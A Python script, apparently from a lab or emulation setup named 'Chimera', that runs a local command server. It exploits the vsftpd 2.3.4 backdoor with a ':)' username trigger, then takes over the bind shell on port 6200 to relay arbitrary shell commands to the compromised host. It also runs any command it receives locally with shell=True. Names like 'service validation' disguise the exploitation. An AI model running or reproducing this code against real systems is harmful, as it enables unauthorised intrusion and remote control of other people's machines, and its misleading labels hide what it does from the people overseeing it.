#!/usr/bin/env python3
import socket, threading, subprocess, time

HOST, PORT = '127.0.0.1', 9999
nodes, sockets = {1: "LOCAL_KALI_STAGING"}, {}

def execute_local(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=60).decode()
    except Exception as e:
        return str(e)

def trigger_service_validation(ip):
    try:
        print(f"[*] Validating Service: Sending trigger to {ip}:21...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, 21))
        s.recv(1024)
        s.send(b"USER chimera:)\r\n")
        s.recv(1024)
        s.send(b"PASS ignite\r\n")
        s.close()
        
        time.sleep(1.5)
        
        print(f"[*] Establishing validation channel on {ip}:6200...")
        sh = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sh.settimeout(5)
        sh.connect((ip, 6200))
        
        nodes[2] = ip
        sockets[2] = sh
        return f"[+] Service validation complete. Node 2 bound to {ip}."
    except Exception as e:
        return f"[-] Validation failure: {e}"

def execute_remote(nid, cmd):
    if nid not in sockets:
        return f"[-] Error: Node {nid} has no active validation channel."
    
    sock = sockets[nid]
    try:
        sock.send((cmd + "\n").encode('utf-8'))
        time.sleep(0.5)
        response = sock.recv(4096).decode('utf-8')
        
        if "whoami" in cmd or "cat" in cmd:
            response += "\n[+] MISSION ACCOMPLISHED"
            
        return response
    except Exception as e:
        return f"[-] Channel error on Node {nid}: {e}"

def handle_request(client_socket):
    try:
        request = client_socket.recv(4096).decode('utf-8').strip()
        if not request: return
        
        parts = request.split()
        cmd_type = parts[0].lower()
        
        response = ""
        if cmd_type == "nodes":
            response = "--- Active Chimera Nodes ---\n"
            for nid, ip in nodes.items():
                response += f"[{nid}] {ip} - Status: ALIVE\n"
            response += "----------------------------"
            
        elif cmd_type == "task":
            if len(parts) < 3:
                response = "[-] Task usage: task <id> <cmd>"
            else:
                node_id = int(parts[1])
                bash_cmd = " ".join(parts[2:])
                if node_id == 1:
                    response = execute_local(bash_cmd)
                else:
                    response = execute_remote(node_id, bash_cmd)
                    
        elif cmd_type == "analyze":
            if len(parts) < 2:
                response = "[-] Analyze usage: analyze <ip>"
            else:
                response = trigger_service_validation(parts[1])
        else:
            response = f"[-] Command {cmd_type} not implemented."

        client_socket.sendall(response.encode('utf-8'))
    finally:
        client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[*] Chimera Emulation Backend online on {HOST}:{PORT}")
    
    while True:
        client_sock, addr = server.accept()
        threading.Thread(target=handle_request, args=(client_sock,)).start()

if __name__ == "__main__":
    main()
